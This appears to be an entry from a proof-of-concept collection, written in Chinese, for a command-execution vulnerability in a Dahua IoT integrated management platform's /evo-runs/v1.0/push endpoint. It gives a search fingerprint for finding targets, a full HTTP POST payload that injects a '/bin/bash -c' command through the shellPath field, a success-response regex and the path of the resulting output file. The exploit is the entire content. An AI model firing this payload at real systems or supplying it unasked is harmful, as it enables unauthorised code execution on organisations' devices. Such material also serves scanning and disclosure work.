# dahua智能物联网综合管理平台push命令执行漏洞

## 漏洞特征

body="static/qwebchannel.js" && body="/*客户端会小于800*/"

## POC

```
POST /evo-runs/v1.0/push HTTP/1.1
Content-Type: application/json
X-Subject-Headerflag: ADAPT

{
    "method": "agent.ossm.mapping.config",
    "info": {
        "configure": "xxx",
        "filePath": "xxx",
        "paramMap": {
            "shellPath": "/bin/bash -c 'id>/opt/evoWpms/static/xxx.txt'",
            "filePath": "xxx"
        },
        "requestIp": ""
    }
}
```

## 响应特征

```
200

(?=.*?success)(?=.*?true).*?$
```



## 文件定位

/static/xxx.txt
